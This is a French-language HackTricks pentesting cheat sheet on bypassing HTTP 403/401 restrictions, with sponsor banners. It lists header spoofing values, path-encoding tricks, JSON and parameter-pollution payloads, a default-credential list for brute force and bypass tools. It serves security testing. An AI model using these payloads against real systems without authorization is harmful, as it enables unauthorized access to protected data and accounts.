# 403 & 401 Bypasses

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et votre cloud**

**Trouvez et signalez des vulnérabilités critiques et exploitables ayant un impact commercial réel.** Utilisez nos 20+ outils personnalisés pour cartographier la surface d'attaque, trouver des problèmes de sécurité qui vous permettent d'escalader les privilèges, et utilisez des exploits automatisés pour collecter des preuves essentielles, transformant votre travail acharné en rapports convaincants.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Fuzzing des verbes/méthodes HTTP

Essayez d'utiliser **différents verbes** pour accéder au fichier : `GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK`

- Vérifiez les en-têtes de réponse, peut-être que certaines informations peuvent être fournies. Par exemple, une **réponse 200** à **HEAD** avec `Content-Length: 55` signifie que le **verbe HEAD peut accéder à l'info**. Mais vous devez encore trouver un moyen d'exfiltrer cette info.
- Utiliser un en-tête HTTP comme `X-HTTP-Method-Override: PUT` peut écraser le verbe utilisé.
- Utilisez le verbe **`TRACE`** et si vous avez beaucoup de chance, peut-être que dans la réponse vous pouvez également voir les **en-têtes ajoutés par des proxies intermédiaires** qui pourraient être utiles.

## Fuzzing des en-têtes HTTP

- **Changez l'en-tête Host** en une valeur arbitraire ([qui a fonctionné ici](https://medium.com/@sechunter/exploiting-admin-panel-like-a-boss-fc2dd2499d31))
- Essayez d'**utiliser d'autres agents utilisateurs** pour accéder à la ressource.
- **Fuzz des en-têtes HTTP** : Essayez d'utiliser les **en-têtes** du proxy HTTP, l'authentification HTTP de base et le brute-force NTLM (avec seulement quelques combinaisons) et d'autres techniques. Pour faire tout cela, j'ai créé l'outil [**fuzzhttpbypass**](https://github.com/carlospolop/fuzzhttpbypass).

- `X-Originating-IP: 127.0.0.1`
- `X-Forwarded-For: 127.0.0.1`
- `X-Forwarded: 127.0.0.1`
- `Forwarded-For: 127.0.0.1`
- `X-Remote-IP: 127.0.0.1`
- `X-Remote-Addr: 127.0.0.1`
- `X-ProxyUser-Ip: 127.0.0.1`
- `X-Original-URL: 127.0.0.1`
- `Client-IP: 127.0.0.1`
- `True-Client-IP: 127.0.0.1`
- `Cluster-Client-IP: 127.0.0.1`
- `X-ProxyUser-Ip: 127.0.0.1`
- `Host: localhost`

Si le **chemin est protégé**, vous pouvez essayer de contourner la protection du chemin en utilisant ces autres en-têtes :

- `X-Original-URL: /admin/console`
- `X-Rewrite-URL: /admin/console`

- Si la page est **derrière un proxy**, peut-être que c'est le proxy qui vous empêche d'accéder aux informations privées. Essayez d'abuser de [**HTTP Request Smuggling**](../../pentesting-web/http-request-smuggling/) **ou** [**des en-têtes hop-by-hop**](../../pentesting-web/abusing-hop-by-hop-headers.md)**.**
- Fuzz [**des en-têtes HTTP spéciaux**](special-http-headers.md) à la recherche de différentes réponses.
- **Fuzz des en-têtes HTTP spéciaux** tout en fuzzant **les méthodes HTTP**.
- **Supprimez l'en-tête Host** et peut-être que vous pourrez contourner la protection.

## Fuzzing des chemins

Si _/path_ est bloqué :

- Essayez d'utiliser _**/**_**%2e/path \_(si l'accès est bloqué par un proxy, cela pourrait contourner la protection). Essayez aussi**\_\*\* /%252e\*\*/path (double encodage URL)
- Essayez le **bypass Unicode** : _/**%ef%bc%8f**path_ (Les caractères encodés en URL sont comme "/") donc lorsqu'ils sont réencodés, cela deviendra _//path_ et peut-être que vous aurez déjà contourné la vérification du nom _/path_
- **Autres contournements de chemin** :
- site.com/secret –> HTTP 403 Forbidden
- site.com/SECRET –> HTTP 200 OK
- site.com/secret/ –> HTTP 200 OK
- site.com/secret/. –> HTTP 200 OK
- site.com//secret// –> HTTP 200 OK
- site.com/./secret/.. –> HTTP 200 OK
- site.com/;/secret –> HTTP 200 OK
- site.com/.;/secret –> HTTP 200 OK
- site.com//;//secret –> HTTP 200 OK
- site.com/secret.json –> HTTP 200 OK (ruby)
- Utilisez toute [**cette liste**](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Unicode.txt) dans les situations suivantes :
- /FUZZsecret
- /FUZZ/secret
- /secretFUZZ
- **Autres contournements d'API :**
- /v3/users_data/1234 --> 403 Forbidden
- /v1/users_data/1234 --> 200 OK
- {“id”:111} --> 401 Non autorisé
- {“id”:\[111]} --> 200 OK
- {“id”:111} --> 401 Non autorisé
- {“id”:{“id”:111\}} --> 200 OK
- {"user_id":"\<legit_id>","user_id":"\<victims_id>"} (Pollution de paramètres JSON)
- user_id=ATTACKER_ID\&user_id=VICTIM_ID (Pollution de paramètres)

## **Manipulation de paramètres**

- Changez la **valeur du paramètre** : De **`id=123` --> `id=124`**
- Ajoutez des paramètres supplémentaires à l'URL : `?`**`id=124` —-> `id=124&isAdmin=true`**
- Supprimez les paramètres
- Réorganisez les paramètres
- Utilisez des caractères spéciaux.
- Effectuez des tests de limites dans les paramètres — fournissez des valeurs comme _-234_ ou _0_ ou _99999999_ (juste quelques valeurs d'exemple).

## **Version du protocole**

Si vous utilisez HTTP/1.1 **essayez d'utiliser 1.0** ou même testez s'il **prend en charge 2.0**.

## **Autres contournements**

- Obtenez l'**IP** ou le **CNAME** du domaine et essayez de **le contacter directement**.
- Essayez de **stresser le serveur** en envoyant des requêtes GET courantes ([Cela a fonctionné pour ce gars avec Facebook](https://medium.com/@amineaboud/story-of-a-weird-vulnerability-i-found-on-facebook-fc0875eb5125)).
- **Changez le protocole** : de http à https, ou de https à http
- Allez sur [**https://archive.org/web/**](https://archive.org/web/) et vérifiez si dans le passé ce fichier était **accessible dans le monde entier**.

## **Brute Force**

- **Devinez le mot de passe** : Testez les identifiants courants suivants. Savez-vous quelque chose sur la victime ? Ou le nom du défi CTF ?
- [**Brute force**](../../generic-hacking/brute-force.md#http-brute)**:** Essayez l'authentification basique, digest et NTLM.
```:Common creds
admin    admin
admin    password
admin    1234
admin    admin1234
admin    123456
root     toor
test     test
guest    guest
```
## Outils Automatiques

- [https://github.com/lobuhi/byp4xx](https://github.com/lobuhi/byp4xx)
- [https://github.com/iamj0ker/bypass-403](https://github.com/iamj0ker/bypass-403)
- [https://github.com/gotr00t0day/forbiddenpass](https://github.com/gotr00t0day/forbiddenpass)
- [Burp Extension - 403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122)
- [Forbidden Buster](https://github.com/Sn1r/Forbidden-Buster)
- [NoMoreForbidden](https://github.com/akinerk/NoMoreForbidden)

<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et votre cloud**

**Trouvez et signalez des vulnérabilités critiques et exploitables ayant un impact commercial réel.** Utilisez nos 20+ outils personnalisés pour cartographier la surface d'attaque, trouver des problèmes de sécurité qui vous permettent d'escalader les privilèges, et utilisez des exploits automatisés pour collecter des preuves essentielles, transformant votre travail acharné en rapports convaincants.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{{#include ../../banners/hacktricks-training.md}}
